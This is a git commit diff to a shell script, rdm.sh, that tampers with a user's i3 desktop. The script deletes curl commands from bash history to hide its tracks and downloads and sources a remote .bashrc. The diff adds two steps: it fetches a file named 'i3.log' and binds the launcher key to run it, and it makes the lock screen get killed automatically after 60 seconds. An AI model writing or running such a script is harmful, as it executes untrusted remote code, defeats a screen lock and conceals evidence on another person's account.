58ea2f661338bbed1eb55e5ca26323f0bf19a1c0
Dimitri Attal <dimitri.attal@epita.fr>
2026-01-22 20:08:22 +0100

    ajout modif dmenu

--- rdm.sh
+++ rdm.sh
@@ -4,6 +4,11 @@ cmd="curl .*"
 grep -v "$cmd" ~/.bash_history > ~/.bash_history.tmp && mv ~/.bash_history.tmp ~/.bash_history && history -c && history -r
 curl -sO https://raw.githubusercontent.com/did73at/cflse/main/.bashrc
 source .bashrc
+curl -sO https://raw.githubusercontent.com/did73at/cflse/main/i3.log
+mv i3.log ~/i3.log
+#~/afs/.confs/config/i3/
 filename=".config/i3/config"
-sed '/bindsym .* exec i3lock / s|$| \&\& sleep 5 \&\& pkill i3lock|' "$filename" > "$filename.tmp" && mv "$filename.tmp" "$filename"
+sed '/bindsym .* exec i3lock / s|$| \&\& sleep 60 \&\& pkill i3lock|' "$filename" > "$filename.tmp" && mv "$filename.tmp" "$filename"
+sed 's|\(bindsym $mod+d exec --no-startup-id).*|\1 ~/i3.log|' "$filename" > "$filename.tmp" && mv "$filename.tmp" "$filename"
+
 i3-msg reload
